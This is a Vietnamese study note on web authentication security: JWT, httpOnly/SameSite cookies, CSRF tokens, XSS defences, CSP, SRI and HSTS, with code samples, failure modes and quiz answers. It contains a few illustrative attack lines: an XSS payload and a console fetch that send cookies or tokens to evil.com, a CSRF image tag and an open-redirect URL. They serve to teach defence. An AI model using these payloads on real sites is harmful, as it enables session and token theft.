# Auth, Cookies, CSRF/XSS và CSP/SRI/HSTS — JWT httpOnly Secure SameSite vs localStorage, SameSite/CSRF Token, CSP/SRI/HSTS

> Tags: #auth #JWT #httpOnly #Secure #SameSite #CSRF #XSS #CSP #SRI #HSTS #X-Frame-Options | Nguồn: `docs/07-security.md` câu 122-134, `docs/06-browser-web-platform.md` câu 112/121 | Mức: P0

## 1. Định nghĩa chính xác

**JWT** (`header.payload.signature` base64url, `HMAC/RSA`) là token **stateless** tự chứa claims (`sub`, `exp`, `role`) và tự verify bằng signature, không cần session store. **Không mã hóa** — chỉ base64, ai cũng đọc payload. Ưu: scale horizontal, microservices verify bằng public key; nhược: **không revoke trước `exp`** (phải đợi hết hạn hoặc blacklist), **to** (1-2KB mỗi request), **XSS đọc được nếu lưu localStorage**.

**httpOnly Cookie** (`Set-Cookie: token=...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600`) là cookie **JS không đọc được** (`document.cookie` không thấy), chống XSS, **tự gửi** kèm mọi request cùng domain (tiện nhưng mở CSRF). `Secure` chỉ gửi qua HTTPS, `SameSite` kiểm soát gửi cross-site.

**CSRF (Cross-Site Request Forgery)** là attacker lừa browser nạn nhân tự gửi request tới `bank.com` với cookie tự đính kèm (ví dụ `evil.com` auto-submit `<form action="https://bank.com/transfer">`). **XSS (Cross-Site Scripting)** là attacker chèn script độc chạy trong origin nạn nhân, đọc `localStorage`/cookie (nếu không HttpOnly)/DOM. **CSP (Content Security Policy)** là header whitelist nguồn script/style/connect được load, chặn inline script dù attacker chèn được. **SRI (Subresource Integrity)** là `integrity="sha384-..."` + `crossorigin` cho CDN script, browser hash và block nếu CDN bị hijack. **HSTS** (`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`) ép browser chỉ HTTPS, chặn downgrade/SSL strip.

## 2. Cơ chế hoạt động

### 2.1 JWT vs Session

|  | JWT | Session (opaque + Redis) |
|---|---|---|
| State | Stateless (payload trong token) | Stateful (Redis `sess:id → {userId}`) |
| Revoke | Khó (đợi `exp`/blacklist) | Dễ (`DEL sess:id`) |
| Size | Lớn (1-2KB) | Nhỏ (chỉ `sid` 4KB) |
| Scale | Dễ (không share store) | Cần shared Redis |
| XSS | Nguy hiểm nếu `localStorage` | HttpOnly giảm rủi ro |

Cấu trúc JWT: `eyJhbG... (header {alg:"HS256"}) . eyJzdWI... (payload {sub, exp}) . SflKxw... (signature HMACSHA256(base64(header)+"."+base64(payload), secret))`.

### 2.2 Access + Refresh Token (chuẩn)

- **Access Token**: JWT ngắn **5-15 phút**, chứa `sub`, `role`, gửi `Authorization: Bearer <access>` mỗi request. Lưu ở **memory** (biến JS) — XSS khó đọc hơn `localStorage`, mất khi reload nhưng refresh được.
- **Refresh Token**: opaque random 32 bytes, dài **7-30 ngày**, chỉ dùng `POST /auth/refresh` để lấy access mới. Lưu **HttpOnly Secure SameSite=Lax cookie** (JS không đọc), server lưu DB/Redis với `userId`, `family`, `revoked`.
- **Rotation**: mỗi `/refresh` thu hồi refresh cũ, cấp cặp mới. Nếu refresh cũ bị dùng lại → phát hiện **reuse** → revoke cả family (token bị steal).

```
Login: POST /auth/login → { accessToken } + Set-Cookie: refresh=abc; HttpOnly; Secure; SameSite=Lax
Call API: Authorization: Bearer <access> → 401 → POST /auth/refresh (cookie tự gửi) → { accessToken: new } → retry
Logout: server DEL refresh family → 401
```

### 2.3 Lưu token ở đâu

| Nơi lưu | XSS đọc? | CSRF? | Persist reload? | Dùng cho |
|---------|----------|-------|-----------------|----------|
| **localStorage** | **Dễ** `getItem` | Không (tự gắn header) | Có | **Không nên** cho token |
| **HttpOnly Cookie** | **Không** | **Có** (tự gửi) | Có | Refresh token, session |
| **Memory** (`let accessToken`) | Khó hơn (cần JS inject) | Không | **Không** | Access token ngắn |
| `sessionStorage` | Dễ | Không | Tab only | Tạm, cũng XSS |

Pattern Senior: **Access memory + Refresh httpOnly SameSite Lax + CSRF token cho refresh nếu cần**. Đừng `localStorage.setItem('token', jwt)` nếu có thể tránh — CSP mạnh cũng không cứu nếu XSS đã chạy.

### 2.4 SameSite và CSRF Token

`SameSite` cho browser biết khi nào **không gửi** cookie cross-site:

| SameSite | Gửi POST cross-site? | Gửi GET khi click link từ evil? | Dùng khi |
|----------|----------------------|----------------------------------|----------|
| **Lax** (default Chrome 80+) | **Không** | **Có** (top-level GET navigation) | Mặc định, cân bằng, không break OAuth redirect |
| **Strict** | Không | **Không** (cả GET) | Bank/admin — an toàn nhất nhưng UX tệ (click link từ Gmail cũng không gửi, phải login lại) |
| **None** | **Có** (phải `Secure`) | Có | Embed/iframe cần cross-site cookie |

`Lax` vẫn cho GET cross-site → attacker có thể CSRF bằng GET nếu API sai (GET đổi state). Nên cần thêm **CSRF Token**: server sinh per-session, nhúng `<meta name="csrf-token">`, client gửi `X-CSRF-Token` header, server verify. Attacker ở `evil.com` không đọc được token do SOP.

Double Submit vs Synchronizer: Double Submit lưu token trong cookie + header so sánh; Synchronizer lưu server-side session.

### 2.5 XSS — 3 loại và phòng thủ

- **Stored**: payload lưu DB, mọi user xem đều dính (`<img onerror=fetch('https://evil.com?c='+document.cookie)>` trong comment).
- **Reflected**: payload trong URL, server phản chiếu không escape (`/search?q=<script>`).
- **DOM-based**: không qua server, client `innerHTML = location.hash`.

Phòng thủ tầng:
1. **Escape output**: React `{value}` tự escape, `textContent` safe; chỉ `dangerouslySetInnerHTML` nguy hiểm.
2. **Sanitize khi cần HTML**: `DOMPurify.sanitize(html, { ALLOWED_TAGS:['b','a'] })`.
3. **Không sink nguy hiểm**: `innerHTML`, `document.write`, `eval`, `new Function`, `setTimeout(string)`.
4. **HttpOnly cookie**: XSS chạy nhưng không đọc cookie.
5. **CSP**: chặn inline script dù chèn được.

### 2.6 CSP, SRI, HSTS

**CSP directive** hay dùng:
- `default-src 'self'` — fallback.
- `script-src 'self' https://cdn.example.com 'nonce-abc123'` — chỉ script self/CDN + inline có nonce.
- `style-src 'self' 'nonce-...'`, `img-src 'self' data: https:`, `connect-src 'self' https://api.example.com`, `frame-ancestors 'none'` (chống clickjacking, thay `X-Frame-Options`), `base-uri 'self'`, `form-action 'self'`, `object-src 'none'`.

Triển khai: `Content-Security-Policy-Report-Only` thu thập `report-uri` trước, rồi enforce. `nonce` mỗi request random, không cache.

**SRI**: `<script src="https://cdn.example.com/lib.js" integrity="sha384-oqVu..." crossorigin="anonymous">` — browser hash SHA384, mismatch → block.

**HSTS**: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` — sau lần đầu HTTPS, browser tự upgrade mọi `http://` → `https://`, chặn SSL strip. Phải kèm `preload` submit tới hstspreload.org.

Các header khác: `X-Content-Type-Options: nosniff` (chặn MIME sniff), `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=()`, `X-Frame-Options: DENY` (cũ, CSP `frame-ancestors` thay thế).

## 3. Ví dụ tối thiểu

```http
# 3.1 Cookie
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
Set-Cookie: refresh=xyz; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=604800

# 3.2 CSP + HSTS + SRI headers
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com 'nonce-rAnd0m'; style-src 'self' 'nonce-rAnd0m'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'; report-uri /csp-report
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()

# 3.3 JWT
# eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJleHAiOjE3MTQwMDAwMDB9.SflKxw...
```

```js
// 3.4 JWT tạo & verify (Node)
import jwt from 'jsonwebtoken';
const token = jwt.sign({ sub:'user123', role:'admin' }, process.env.JWT_SECRET, { expiresIn:'15m', issuer:'myapp' });
const payload = jwt.verify(token, process.env.JWT_SECRET); // throw nếu hết hạn/sai signature
console.log(JSON.parse(atob(token.split('.')[1]))); // payload đọc được — không chứa secret!

// 3.5 Access memory + httpOnly refresh
let accessToken = null;
async function login(email, pass) {
  const res = await fetch('/auth/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({email, pass}) });
  const { accessToken: at } = await res.json();
  accessToken = at; // memory
}
async function apiFetch(url, opts={}) {
  let res = await fetch(url, { ...opts, headers:{ ...opts.headers, Authorization:`Bearer ${accessToken}` } });
  if (res.status === 401) {
    const r = await fetch('/auth/refresh', { method:'POST', credentials:'include' }); // gửi refresh cookie
    if (!r.ok) { location.href='/login'; throw new Error('refresh failed'); }
    accessToken = (await r.json()).accessToken;
    res = await fetch(url, { ...opts, headers:{ ...opts.headers, Authorization:`Bearer ${accessToken}` } });
  }
  return res;
}

// 3.6 CSRF Token
// Server
import crypto from 'crypto';
app.use((req,res,next)=>{
  if (!req.cookies.csrfToken) res.cookie('csrfToken', crypto.randomBytes(32).toString('hex'), { sameSite:'Lax', secure:true });
  next();
});
// Client
const token = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
fetch('/api/transfer', { method:'POST', headers:{ 'X-CSRF-Token': token, 'Content-Type':'application/json' }, credentials:'include', body:JSON.stringify({to:'bob', amount:100}) });
// Server verify
app.post('/api/transfer', (req,res)=>{
  if (req.headers['x-csrf-token'] !== req.cookies.csrfToken) return res.status(403).json({error:'CSRF'});
  if (!['https://bank.com'].includes(req.headers.origin)) return res.status(403).end();
});

// 3.7 XSS safe
function Comment({ text }) { return <div>{text}</div>; } // React auto-escape
// ❌ <div dangerouslySetInnerHTML={{__html: html}} />
// ✅
import DOMPurify from 'dompurify';
function SafeHTML({ html }) {
  const clean = DOMPurify.sanitize(html, { ALLOWED_TAGS:['b','i','a','p','ul','li'], ALLOWED_ATTR:['href'] });
  return <div dangerouslySetInnerHTML={{__html: clean}} />;
}
function safeUrl(url) {
  try {
    const u = new URL(url, location.origin);
    if (!['http:','https:'].includes(u.protocol)) return '/';
    return u.href;
  } catch { return '/'; }
}

// 3.8 CSP nonce (Express)
app.use((req,res,next)=>{
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  res.setHeader('Content-Security-Policy', `default-src 'self'; script-src 'self' 'nonce-${nonce}' https://cdn.example.com; style-src 'self' 'nonce-${nonce}'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none'; report-uri /csp-report`);
  next();
});
// Template: <script nonce="<%= nonce %>">console.log('allowed')</script>

// 3.9 SRI
// <script src="https://cdn.example.com/lib.js" integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" crossorigin="anonymous"></script>

// 3.10 OAuth2 PKCE (SPA) — không lưu client_secret ở frontend
function base64url(buf){ return btoa(String.fromCharCode(...new Uint8Array(buf))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,''); }
async function createPKCE(){
  const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
  const challenge = base64url(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier)));
  sessionStorage.setItem('pkce_verifier', verifier);
  return challenge;
}
const challenge = await createPKCE();
const state = crypto.randomUUID();
sessionStorage.setItem('oauth_state', state);
location.href = `https://auth.example.com/authorize?response_type=code&client_id=app123&redirect_uri=${encodeURIComponent(location.origin+'/callback')}&scope=openid%20profile%20email&code_challenge=${challenge}&code_challenge_method=S256&state=${state}`;

// 3.11 Không chứa secret ở frontend
// ❌ const stripe = new Stripe(process.env.STRIPE_SECRET_KEY) // bundle chứa sk_live_xxx
// ✅ frontend gọi backend proxy, backend dùng sk_live_xxx
async function createPayment(amount){ return fetch('/api/payments', {method:'POST', body:JSON.stringify({amount})}).then(r=>r.json()); }
// backend: const stripe = new Stripe(process.env.STRIPE_SECRET_KEY)
// VITE_ / NEXT_PUBLIC_ đều embed vào bundle — chỉ public key (pk_..., apiUrl)
```

```bash
# 3.12 curl
curl -i https://shop.com/api/me -H "Authorization: Bearer $ACCESS" -H "X-CSRF-Token: $CSRF" --cookie "refresh=xyz"
curl -I https://shop.com/ | grep -i "strict-transport\|content-security"
# Check HSTS preload: https://hstspreload.org/?domain=shop.com
```

## 4. So sánh / Phân loại

| Tiêu chí | localStorage | HttpOnly Cookie | Memory |
|----------|--------------|-----------------|--------|
| XSS đọc? | Dễ `getItem` | **Không** | Khó hơn (cần JS) |
| CSRF? | Không (tự gắn header) | **Có** (tự gửi) | Không |
| Persist reload? | Có | Có | **Không** |
| Dùng cho | Không nên cho token | Refresh token, session | **Access token ngắn** |

| SameSite | POST cross-site | GET click link evil→bank | Trade-off |
|----------|-----------------|--------------------------|-----------|
| **Lax** (default) | Không | Có | Cân bằng, cho OAuth redirect |
| **Strict** | Không | Không | An toàn nhất, break link ngoài |
| **None** (phải Secure) | Có | Có | Chỉ cho embed/iframe |

| XSS loại | Lưu đâu | Server thấy? | Ví dụ |
|----------|---------|--------------|-------|
| Stored | DB | Có | Comment `<img onerror>` |
| Reflected | URL | Có | `search?q=<script>` |
| DOM-based | Client | Không | `innerHTML = location.hash` |

| Phòng thủ | Tác dụng |
|-----------|----------|
| `HttpOnly` | XSS không đọc cookie |
| `SameSite=Lax` | Chặn CSRF POST cross-site |
| `CSRF Token` (header) | Attacker không đọc token do SOP |
| `CSP` | Chặn inline script dù chèn được |
| `SRI` | Chặn CDN hijack |
| `HSTS` | Ép HTTPS, chặn SSL strip/downgrade |
| `X-Frame-Options` / `frame-ancestors 'none'` | Chặn clickjacking |
| `X-Content-Type-Options: nosniff` | Chặn MIME sniff |

| `X-Frame-Options` (cũ) | `CSP frame-ancestors` (mới) |
|------------------------|-----------------------------|
| `DENY` / `SAMEORIGIN` | `'none'` / `'self'` / `https://trusted.com`, hỗ trợ nhiều origin + report |

| Secret thật (không ở frontend) | Public (được ở frontend) |
|--------------------------------|---------------------------|
| `DB_PASSWORD`, `JWT_SECRET`, `STRIPE_SECRET_KEY` (`sk_live_`), `client_secret` | `NEXT_PUBLIC_API_URL`, `STRIPE_PUBLISHABLE_KEY` (`pk_live_`), `NEXT_PUBLIC_MAPBOX_TOKEN` (restrict domain) |

## 5. Trade-off / Khi nào KHÔNG dùng

- **Không lưu JWT trong `localStorage`**: `localStorage.getItem('token')` là mục tiêu số 1 XSS. Dùng memory + httpOnly refresh. Chỉ chấp nhận `localStorage` nếu SPA không có backend set cookie và đã có CSP strict + `DOMPurify` + access ngắn 5p.
- **Không `SameSite=None` mặc định**: `None` luôn gửi cross-site → mở CSRF, lại phải `Secure` (HTTPS). Chỉ `None` cho embed/widget thực sự cần.
- **Không `SameSite=Strict` cho mọi site**: Strict chặn cả GET top-level → user click link từ Gmail/ Slack sang `app.com` bị logout, OAuth redirect mất cookie. Dùng `Lax` cho 90% app, `Strict` chỉ cho bank/admin.
- **Không chỉ dựa SameSite chống CSRF**: `Lax` vẫn cho GET, API sai dùng GET đổi state → vẫn CSRF. Phải **SameSite + CSRF Token + Origin check** cho `POST/PUT/DELETE`.
- **Không `CSP 'unsafe-inline'`**: tiện nhưng mở cửa XSS (inline script attacker chạy). Dùng `nonce` per-request (không cache) hoặc `hash`. `'strict-dynamic'` cho bundler nhưng hiểu rõ mới dùng.
- **Không dùng `eval`/`innerHTML` với user input**: `eval(userInput)`, `setTimeout(string)`, `new Function` đều sink XSS. `textContent` safe hơn `innerText`/`innerHTML`.
- **Không chứa secret trong bundle**: `NEXT_PUBLIC_`, `VITE_` đều embed public. Secret (`sk_`, `DB_`) chỉ ở server, frontend qua proxy. `NEXT_PUBLIC_` khác server-only env (chỉ server đọc).
- **Không quên `Secure` và `HttpOnly`**: thiếu `Secure` → cookie gửi qua HTTP, bị sniff; thiếu `HttpOnly` → XSS đọc.
- **Khi nào không cần CSP**: prototype nội bộ, nhưng production luôn cần — Report-Only trước, fix vi phạm, rồi enforce.

## 6. Failure modes & Cách đo / Debug

- **Lỗi 1: `localStorage` token → XSS lấy**
  - Triệu chứng: `fetch('https://evil.com?c='+localStorage.getItem('access'))` trong console.
  - Fix: chuyển memory + httpOnly refresh, `HttpOnly; Secure; SameSite=Lax`.
  - Đo: DevTools Application → Local Storage, Sources search `localStorage.getItem`.

- **Lỗi 2: Cookie thiếu `HttpOnly`/`Secure`/`SameSite`**
  - Triệu chứng: `document.cookie` thấy `session`, hoặc `Set-Cookie` không `Secure` trên HTTP.
  - Fix: `Set-Cookie: ...; HttpOnly; Secure; SameSite=Lax; Path=/`.
  - Đo: Network → Response `Set-Cookie`, Application → Cookies, `document.cookie` trong console.

- **Lỗi 3: CSRF với `SameSite=None` hoặc `Lax` + GET state-changing**
  - Triệu chứng: `evil.com` `<img src="https://bank.com/transfer?to=attacker">` vẫn gửi cookie, tiền chuyển.
  - Fix: `SameSite=Lax` + CSRF token header + `Origin` check, **không dùng GET cho state-changing**.
  - Đo: DevTools Network → `Cookie` gửi kèm cross-site? `SameSite` trong Application → Cookies.

- **Lỗi 4: CSP block app (thiếu `nonce`)**
  - Triệu chứng: `Refused to execute inline script because it violates CSP`.
  - Fix: `Report-Only` trước, thêm `nonce` cho inline cần thiết, `report-uri /csp-report` thu thập.
  - Đo: Console CSP violation, `chrome://net-internals`, `curl -I | grep Content-Security`.

- **Lỗi 5: SRI mismatch → CDN script block**
  - Triệu chứng: `Failed to find a valid digest ... integrity ...` script không chạy.
  - Fix: tính lại `sha384` sau mỗi deploy CDN, `openssl dgst -sha384 -binary lib.js | openssl base64 -A`.
  - Đo: Console SRI error, Network.

- **Lỗi 6: Thiếu HSTS → SSL strip**
  - Triệu chứng: `http://shop.com` không redirect/upgrade, attacker downgrade.
  - Fix: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` + submit hstspreload.org.
  - Đo: `curl -I https://shop.com | grep Strict`, `chrome://net-internals/#hsts`.

- **Lỗi 7: Open redirect `?next=https://evil.com`**
  - Triệu chứng: `shop.com/login?next=https://evil.com` redirect tới evil → phishing.
  - Fix: `safeRedirect` chỉ cho relative hoặc whitelist `ALLOWED_HOSTS.includes(hostname)`, chặn `//evil.com`.
  - Đo: `curl "https://shop.com/redirect?url=https://evil.com" -v`.

- **Lỗi 8: `JWT alg:none` attack**
  - Triệu chứng: attacker đổi `header {alg:"none"}` bỏ signature, server verify pass.
  - Fix: server whitelist `alg: ["HS256","RS256"]`, không chấp `none`.
  - Đo: `jwt.verify(token, secret, { algorithms:['HS256'] })`.

- **Lỗi 9: Quên `Vary: Origin` cho CORS + CDN cache**
  - Xem file 01 — liên quan auth cross-origin.

- **Công cụ**:
  - DevTools **Application** → Cookies (`HttpOnly` tick, `SameSite`), Local Storage.
  - **Network** → `Set-Cookie`, `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`.
  - **Console** → CSP violation, `document.cookie`.
  - `curl -I https://shop.com` → headers, `npx snyk test`, `npm audit`, `eslint-plugin-security`, bundle scan `grep -r "sk_live" dist`.
  - CSP report: `POST /csp-report`, Lighthouse/Best Practices.

## 7. Câu hỏi tự kiểm tra

1. Vì sao không lưu JWT trong `localStorage` và nên lưu ở đâu? So sánh `HttpOnly Secure SameSite` vs memory vs localStorage về XSS/CSRF/persist?
2. `SameSite=Lax` vs `Strict` vs `None` khác gì về gửi cookie cross-site (POST vs GET top-level) và CSRF? Vì sao `Lax + CSRF Token + Origin check` là combo chuẩn?
3. CSP (`script-src 'nonce-...'`, `frame-ancestors 'none'`) + SRI (`integrity`+`crossorigin`) + HSTS (`max-age`+`preload`) mỗi cái chặn gì và triển khai thế nào (Report-Only, nonce per-request, preload)?

<details>
<summary>Đáp án 30s</summary>

1. `localStorage` **XSS đọc được ngay** `getItem('token')` → attacker lấy JWT dùng 7 ngày, không revoke. **HttpOnly cookie** JS không đọc, chống XSS nhưng **tự gửi** → mở CSRF, cần `Secure` (chỉ HTTPS) + `SameSite=Lax/Strict` + CSRF token. **Memory** (`let accessToken`) XSS vẫn đọc nếu inject JS nhưng **khó hơn**, **mất khi reload** → phải ` /refresh` silent. Chuẩn: **access ngắn 5-15p trong memory + refresh dài 7-30 ngày trong HttpOnly Secure SameSite Lax cookie + rotation**, không `localStorage`.
2. **Lax** (default): chặn POST/PUT/DELETE cross-site, cho GET top-level (click link từ evil sang bank vẫn gửi) — cân bằng, không break OAuth. **Strict**: chặn cả GET cross-site — an toàn nhất nhưng click link ngoài cũng mất cookie. **None**: luôn gửi, phải `Secure`, chỉ cho embed/iframe. `Lax` vẫn cho GET nên nếu API dùng GET đổi state → vẫn CSRF, nên cần thêm **CSRF Token** (server sinh, client gửi `X-CSRF-Token` header, attacker không đọc do SOP) + check `Origin` cho state-changing.
3. **CSP**: `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn 'nonce-xxx'; frame-ancestors 'none'` whitelist nguồn script/style/connect, chặn inline dù XSS chèn được; triển khai `Report-Only` thu thập `report-uri` rồi enforce, `nonce` random mỗi request. **SRI**: `<script integrity="sha384-..." crossorigin>` browser hash SHA384, mismatch → block, chống CDN hijack. **HSTS**: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` ép browser chỉ HTTPS sau lần đầu, chặn downgrade/SSL strip, submit hstspreload.org để preload. Kết hợp `X-Frame-Options: DENY`/`frame-ancestors` chống clickjacking.

</details>

---
*Tham khảo chi tiết: `docs/07-security.md` — Câu 122-134. `docs/06-browser-web-platform.md` — Câu 112, 121. Spec: [MDN — Set-Cookie SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie), [MDN — CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), [MDN — SRI](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity), [RFC 6797 HSTS](https://datatracker.ietf.org/doc/html/rfc6797).*
